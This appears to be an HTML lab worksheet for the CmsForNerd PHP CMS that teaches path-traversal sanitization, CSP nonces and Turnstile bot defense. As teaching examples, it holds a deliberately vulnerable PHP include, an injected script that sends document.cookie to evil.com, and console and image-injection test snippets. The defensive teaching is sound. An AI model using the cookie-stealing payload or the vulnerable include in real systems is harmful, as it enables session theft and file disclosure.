<article class="lab-worksheet">
    <h1>Student Lab Worksheet: Module 3</h1>
    <p class="subtitle">Topic: Defensive Engineering & Perimeter Security</p>

    <div class="requirement-alert">
        <strong>Requirement Level:</strong> Students <strong>MUST</strong> successfully implement a "Level 2" CSP and secure the file loader to achieve "Green-Light" status.
    </div>

    <section class="objectives">
        <h2>🎯 Learning Objectives</h2>
        <ul>
            <li>Understand <strong>Defense-in-Depth</strong> strategies.</li>
            <li>Eliminate <strong>Path Traversal</strong> vulnerabilities using allowlist sanitization.</li>
            <li>Configure a <strong>Content Security Policy (CSP)</strong> to neutralize XSS.</li>
            <li>Implement <strong>Bot Defense</strong> using Cloudflare Turnstile.</li>
        </ul>
    </section>

    <section class="step">
        <h2>🧱 Step 1: The "Defense-in-Depth" Concept</h2>
        <p>Security is like an onion. If one layer fails, another must catch the attacker. In CmsForNerd, we use three primary layers:</p>
        <ol>
            <li><strong>The Code Layer:</strong> Sanitizing inputs (e.g., using <code>SecurityUtils</code>).</li>
            <li><strong>The Browser Layer:</strong> Using CSP to tell the browser what scripts to trust.</li>
            <li><strong>The Network Layer:</strong> Using Turnstile to block automated bots.</li>
        </ol>
    </section>

    <section class="step">
        <h2>🧪 Step 2: Input Hardening (Path Traversal)</h2>
        <p>In legacy versions of CMSForNerd, the code was vulnerable to <strong>Dot-Dot-Slash (../)</strong> attacks:</p>
        <div class="code-block legacy">
            <pre><code>// VULNERABLE CODE - DO NOT USE
$page = $_GET['page'];
include "contents/" . $page . ".php";</code></pre>
        </div>
        <p><strong>Exercise:</strong> Open <code>includes/SecurityUtils.php</code> and ensure <code>sanitizePageName()</code> is used in <code>index.php</code> to neutralize non-alphanumeric characters.</p>
        <div class="code-block modern">
            <pre><code>public static function sanitizePageName(string $pageName): string
{
    // MUST: Only allow alphanumeric characters and hyphens.
    return preg_replace('/[^a-zA-Z0-9\-]/', '', $pageName);
}</code></pre>
        </div>
    </section>

    <section class="step">
        <h2>🛡️ Step 3: CSP Nonces - Google-Grade XSS Protection</h2>
        <p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy with nonces</strong> can block its execution.</p>
        
        <div class="concept-box">
            <h3>What is a Nonce?</h3>
            <p>A <strong>nonce</strong> (number used once) is a cryptographically random string generated for each page load. 
            Only scripts with this exact nonce are allowed to execute.</p>
        </div>

        <h3>📋 Task 3.1: Understand the Implementation</h3>
        <p>Study how CMSForNerd implements CSP nonces across three critical files:</p>
        
        <div class="file-study">
            <h4>File 1: includes/SecurityUtils.php</h4>
            <p>Open this file and find the <code>generateNonce()</code> method:</p>
            <div class="code-block modern">
                <pre><code>public static function generateNonce(): string
{
    // Generate a 128-bit (16-byte) random nonce
    return base64_encode(random_bytes(16));
}</code></pre>
            </div>
            <p><strong>Question:</strong> Why do we use <code>random_bytes(16)</code> instead of <code>rand()</code>?</p>
            <p class="answer-hint">💡 Click to reveal: <code>random_bytes()</code> is cryptographically secure (unpredictable), while <code>rand()</code> is predictable and can be cracked.</p>
        </div>

        <div class="file-study">
            <h4>File 2: includes/CmsContext.php</h4>
            <p>Find where the nonce is stored:</p>
            <div class="code-block modern">
                <pre><code>public string $cspNonce;

public function __construct(
    // ... parameters
    ?string $cspNonce = null,
) {
    $this->cspNonce = $cspNonce ?? SecurityUtils::generateNonce();
}</code></pre>
            </div>
            <p><strong>Task:</strong> Add a <code>var_dump($ctx->cspNonce);</code> in <code>index.php</code> to see the nonce. Reload the page multiple times - does it change?</p>
        </div>

        <div class="file-study">
            <h4>File 3: contents/common-headertag.inc</h4>
            <p>Locate the CSP header and script tags:</p>
            <div class="code-block modern">
                <pre><code>&lt;meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'nonce-&lt;?= $ctx-&gt;cspNonce ?&gt;' ..."&gt;

&lt;script type="application/ld+json" nonce="&lt;?= $ctx-&gt;cspNonce ?&gt;"&gt;
    {/* JSON-LD data */}
&lt;/script&gt;</code></pre>
            </div>
        </div>

        <h3>🧪 Task 3.2: The XSS Attack Simulation</h3>
        <p><strong>Scenario:</strong> An attacker injects malicious JavaScript into your page.</p>
        
        <div class="comparison-grid">
            <div class="vulnerable-code">
                <h4>❌ Without CSP Nonce (Vulnerable)</h4>
                <div class="code-block legacy">
                    <pre><code>&lt;!-- Legitimate script --&gt;
&lt;script&gt;
    console.log("Normal operation");
&lt;/script&gt;

&lt;!-- ATTACKER INJECTED THIS! --&gt;
&lt;script&gt;
    document.location='http://evil.com?cookie='+document.cookie;
&lt;/script&gt;</code></pre>
                </div>
                <p class="danger">🚨 Both scripts execute! User cookies stolen!</p>
            </div>

            <div class="secure-code">
                <h4>✅ With CSP Nonce (Secure)</h4>
                <div class="code-block modern">
                    <pre><code>&lt;!-- Legitimate script with nonce --&gt;
&lt;script nonce="dGhpc2lzYXJhbmRvbQ=="&gt;
    console.log("Normal operation");
&lt;/script&gt;

&lt;!-- ATTACKER INJECTED THIS! --&gt;
&lt;script&gt;
    document.location='http://evil.com?cookie='+document.cookie;
&lt;/script&gt;</code></pre>
                </div>
                <p class="success">✅ Only first script runs! Injected script blocked by CSP!</p>
            </div>
        </div>

        <h3>🔬 Live Challenge: Attack Your Own Site!</h3>
        <ol>
            <li>Open your browser's DevTools (<kbd>F12</kbd>)</li>
            <li>Go to the <strong>Console</strong> tab</li>
            <li>Try to inject a script:
                <div class="code-block">
                    <pre><code>var script = document.createElement('script');
script.textContent = 'alert("I hacked you!");';
document.body.appendChild(script);</code></pre>
                </div>
            </li>
            <li><strong>Expected Result:</strong> You should see an error:
                <div class="console-output">
                    <pre>❌ Refused to execute inline script because it violates the following 
   Content Security Policy directive: "script-src 'self' 'nonce-XXXXX'".</pre>
                </div>
            </li>
        </ol>

        <p><strong>Full Guide:</strong> For a comprehensive tutorial with best practices, see the 
        <a href="csp-nonce-guide.php" class="guide-link">🛡️ CSP Nonce Implementation Guide</a></p>
    </section>

    <section class="step">
        <div class="code-block html">
            <pre><code>&lt;meta http-equiv="Content-Security-Policy" content="
    default-src 'self'; 
    script-src 'self' https://challenges.cloudflare.com;
    style-src 'self' 'unsafe-inline';
"&gt;</code></pre>
        </div>
    </section>

    <section class="step">
        <h2>🤖 Step 4: Hybrid Security - Bot Intel & Turnstile</h2>
        <p>In v4.3.0, we implement a <strong>Hybrid Security</strong> approach to handle automated traffic. We distinguish between "Good Bots" (Search Engines) and "Bad Bots" (Spammers).</p>
        
        <div class="comparison-grid">
            <div class="vulnerable-code" style="border-left-color: #007bff;">
                <h4>🔍 Good Bots: Bot Intelligence</h4>
                <p>Ensures SEO crawlers are recognized and served correctly.</p>
                <ul>
                    <li><strong>Location:</strong> <code>includes/is_bot.php</code></li>
                    <li><strong>Trigger:</strong> Active on every request (GET/POST).</li>
                    <li><strong>Command:</strong> Run <code>composer update-bots</code> to sync verified IP ranges.</li>
                </ul>
            </div>

            <div class="secure-code" style="border-left-color: #dc3545;">
                <h4>🛑 Bad Bots: Turnstile</h4>
                <p>Blocks automated form submissions and brute-force attacks.</p>
                <ul>
                    <li><strong>Location:</strong> <code>includes/turnstile.php</code></li>
                    <li><strong>Trigger:</strong> Automatically active on all <strong>POST</strong> requests.</li>
                    <li><strong>Integration:</strong> Requires a widget in your forms.</li>
                </ul>
            </div>
        </div>

        <h3>📋 Task 4.1: Synchronize Bot Intelligence</h3>
        <p>Open your terminal and run the following command to populate your "Trust Database":</p>
        <div class="terminal-block"><code>composer update-bots</code></div>
        <p>This fetches the latest verified IP addresses for Google and Bing from their official endpoints.</p>

        <h3>📋 Task 4.2: Integrate the Turnstile Widget</h3>
        <p>Add the following code to any form to enable human verification:</p>
        <ol>
            <li>Add the API script to your <code>&lt;head&gt;</code>:
                <div class="code-block html"><code>&lt;script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer&gt;&lt;/script&gt;</code></div>
            </li>
            <li>Place the widget inside your <code>&lt;form&gt;</code>:
                <div class="code-block html"><code>&lt;div class="cf-turnstile" data-sitekey="your-site-key"&gt;&lt;/div&gt;</code></div>
            </li>
        </ol>
    </section>

    <section class="step">
        <h2>✅ Step 5: The "Attack & Defend" Audit</h2>
        
        <h3>5.1: Programmatic Defense</h3>
        <p>Run the test suite to verify Path Traversal protection:</p>
        <div class="terminal-block"><code>./vendor/bin/phpunit --filter it_prevents_directory_traversal_attacks</code></div>

        <h3>5.2: Perimeter Testing</h3>
        <ol>
            <li>Try to inject an external image: <code>&lt;img src="http://evil.com/trap.jpg"&gt;</code>.</li>
            <li><strong>Result:</strong> Open Browser Console (F12). You <strong>MUST</strong> see a CSP error.</li>
        </ol>

        <div class="question-box">
            <p><strong>Question for the Student:</strong> Why is a CSP considered a "Fail-Safe" for XSS vulnerabilities?</p>
            <p class="hint">(Hint: What happens if you forget to use <code>escapeHtml()</code> on a user comment?)</p>
        </div>
    </section>

    <footer class="standards-summary">
        <h2>🎓 Summary of RFC 2119 Standards for Module 3</h2>
        <ul>
            <li><strong>MUST:</strong> All external assets (scripts/fonts) <strong>MUST</strong> be explicitly allowed in the CSP.</li>
            <li><strong>MUST:</strong> Use <code>preg_replace</code> to strip non-alphanumeric characters from file paths.</li>
            <li><strong>SHOULD:</strong> Avoid using <code>'unsafe-inline'</code> in your CSP whenever possible.</li>
            <li><strong>MUST NOT:</strong> Use the <code>http://</code> protocol for external resources; only <strong>https://</strong> is permitted.</li>
        </ul>
    </footer>

    <nav class="progress-nav">
        <a href="lab-module2.php" class="btn prev">&lt; Previous: Module 2 (Standards)</a>
        <a href="lab-module4.php" class="btn next">Next: Module 4 (Automated Testing) &gt;</a>
    </nav>
</article>

<style>
.lab-worksheet h1 { color: #d9534f; margin-bottom: 0.1rem; }
.lab-worksheet .subtitle { font-size: 1.2rem; color: #777; margin-bottom: 2rem; }
.lab-worksheet .requirement-alert { background: #fcf8e3; border: 1px solid #faebcc; color: #8a6d3b; padding: 1rem; border-radius: 4px; margin-bottom: 2rem; }
.lab-worksheet h2 { color: #333; border-bottom: 1px solid #eee; padding-bottom: 0.5rem; margin-top: 2rem; }
.lab-worksheet .code-block { background: #2d2d2d; color: #ccc; padding: 1rem; border-radius: 4px; overflow-x: auto; margin: 1rem 0; }
.lab-worksheet .code-block.legacy { border-left: 5px solid #d9534f; }
.lab-worksheet .code-block.modern { border-left: 5px solid #5cb85c; }
.lab-worksheet .terminal-block { background: #000; color: #00ff00; padding: 1rem; font-family: 'Courier New', Courier, monospace; border-radius: 4px; margin: 1rem 0; }
.lab-worksheet .question-box { background: #d9edf7; border: 1px solid #bce8f1; color: #31708f; padding: 1rem; border-radius: 4px; margin: 2rem 0; }
.lab-worksheet .standards-summary { margin-top: 3rem; background: #f5f5f5; padding: 1.5rem; border-radius: 8px; }
.lab-worksheet .concept-box { background: #e7f3ff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #0066cc; margin: 1.5rem 0; }
.lab-worksheet .file-study { background: #f8f9fa; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; border: 1px solid #dee2e6; }
.lab-worksheet .file-study h4 { color: #495057; margin-top: 0; }
.lab-worksheet .comparison-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 2rem 0; }
.lab-worksheet .vulnerable-code { background: #fff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #dc3545; }
.lab-worksheet .secure-code { background: #fff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #28a745; }
.lab-worksheet .danger { color: #dc3545; font-weight: bold; }
.lab-worksheet .success { color: #28a745; font-weight: bold; }
.lab-worksheet .console-output { background: #2d2d2d; color: #f8f8f2; padding: 1rem; border-radius: 4px; margin: 0.5rem 0; }
.lab-worksheet kbd { background: #333; color: #fff; padding: 0.2rem 0.5rem; border-radius: 3px; font-family: monospace; font-size: 0.9rem; }
.lab-worksheet .guide-link { display: inline-block; background: #c7254e; color: white; padding: 0.5rem 1rem; text-decoration: none; border-radius: 4px; margin: 1rem 0; }
.lab-worksheet .guide-link:hover { background: #a02040; }
.progress-nav { display: flex; justify-content: space-between; margin-top: 3rem; padding: 2rem 0; border-top: 2px solid #eee; }
.progress-nav .btn { padding: 1rem 1.5rem; border-radius: 4px; text-decoration: none; font-weight: bold; }
.progress-nav .prev { background: #6c757d; color: #fff; }
.progress-nav .next { background: #d9534f; color: #fff; }
@media (max-width: 768px) { 
    .progress-nav { flex-direction: column; gap: 1rem; } 
    .lab-worksheet .comparison-grid { grid-template-columns: 1fr; }
}
</style>
